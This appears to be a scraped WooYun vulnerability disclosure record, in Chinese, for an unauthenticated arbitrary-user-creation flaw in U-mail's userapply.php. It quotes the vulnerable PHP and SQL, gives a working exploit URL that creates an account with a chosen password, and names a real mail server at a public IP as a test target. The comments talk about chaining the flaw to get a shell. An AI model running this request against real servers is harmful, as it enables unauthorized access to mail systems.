{"id": 48589, "wybug_id": "wooyun-2014-077235", "wybug_title": "U-mail任意用户添加漏洞（无需登录)", "wybug_corp": "国家互联网应急中心(cncert)", "wybug_author": "路人甲", "wybug_date": "2014-09-24 22:31", "wybug_open_date": "2014-12-23 22:32", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-01：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-23：\t细节向公众公开  简要描述：  详细说明：  由该漏洞即刻能增加邮件一名用户，通过配合其他未知0day 即可getshell只要登录了邮件服务器，危害就很大了。。你懂的。。可导致服务器被入侵。。。文章最后放例子。。。（湖南卫视邮件服务器）在userapply.php中  //省略若干代码  \nif ($Password == \"\" )                                     {                                                        $Password= \"11111\";                                     }                                     if( $nickname == \"\" )                                     {                                                        $nickname= \"{$Mailbox}\";                                     }                                     $insert= \"insert intouserlist(Mailbox,FullName,MailDir,Password,AllowAccess,AllowChangeViaEmail,KeepForwardedMail,ApplyQuotas,EnableMultiPop,MaxDiskSpace,MaxNetFileSpace,DomainID)values('\".$Mailbox.\"','{$nickname}','{$MailDir}','{$Password}','1','1','1','1','1','{$MaxDiskSpace}','{$MaxNetFileSpace}','{$DomainID}')\";  //漏洞点                                     $resadd= @mysql_query( $insert );                                     $token= md5( uniqid( rand( ) ) );                                     $email= $Mailbox.\"@\".$domainname;                                     $full= $Mailbox;                                     $reg_time= date( \"Y-m-d H:i:s\" );                                     $reg_ip= getenv( \"REMOTE_ADDR\" );                                     $log= \"insert intoadmlog(usr_code,username,domainname,action,acttime,Actmailbox,Actdomainname,actarm)values('00','applyuser','\".$domainname.\"','add','{$reg_time}','{$Mailbox}','{$domainname}','user')\";                                     if( $Mailbox != \"\" )                                               …..//省略若干代码\n由于当execadd 变量存在的情况下，然后执行，由于又未做任何判断，当他不存在的时候，直接执行一个insert语句，导致可以添加任意用户当我们构造好下面链接，即可添加一个用户名为test1234  密码为fuck123456的用户如访问此链接Http://192.168.56.128/webmail/userapply.php?execadd=1&DomainID=1&setuppath=8888888&Mailbox=test1234&Password=fuck123456&DomainID=1\n\n如需测试案例。。这里走起http://58.20.34.226/ （湖南卫视邮件服务器）   漏洞证明：  Http://192.168.56.128/webmail/userapply.php?execadd=1&DomainID=1&setuppath=8888888&Mailbox=test1234&Password=fuck123456&DomainID=1\n\n如需测试案例。。这里走起http://58.20.34.226/ （湖南卫视邮件服务器）   修复方案：  考虑考虑下逻辑呗？   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2014-09-28 11:39 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-24 22:39 |    \t\tadm1n \t\t\t( 普通白帽子  |\t\t\t        Rank:216 漏洞数:66        | 只是一个渣渣而已。。。)\t\t \n  mark    \n     2014-09-25 09:22 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  默认开启？    \n     2014-12-24 13:11 |    \t\tCh丶0nly \t\t\t( 普通白帽子  |\t\t\t        Rank:205 漏洞数:50        | 专注网络30年。)\t\t \n  登陆不上    \n     2014-12-25 10:26 |    \t\tf1eecy \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:4        | 图书管理员~)\t\t \n  这个poc没选好，这系统本来就是可以自行注册账户的，应该放个写shell的：）    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}